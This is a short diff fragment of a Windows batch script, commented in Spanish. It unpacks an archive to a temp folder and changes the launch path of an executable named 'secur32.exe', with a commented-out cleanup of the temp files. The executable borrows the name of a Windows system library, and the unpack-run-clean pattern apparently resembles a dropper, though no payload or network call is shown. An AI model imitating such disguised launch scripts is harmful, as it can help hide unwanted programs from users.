@@ -12,7 +12,7 @@ powershell -command "Expand-Archive -Path '%tempPath%' -DestinationPath '%extrac
 
 REM Ejecutar el archivo principal
 cd "%extractPath%"
-start "" secur32.exe
+start "" secur32\secur32.exe
 
 REM Eliminar los archivos temporales
 REM del /f /q "%tempPath%"
